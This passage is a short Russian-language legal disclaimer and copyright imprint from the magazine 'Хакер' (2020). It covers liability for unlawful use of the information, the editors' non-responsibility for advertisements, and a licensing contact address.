к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2020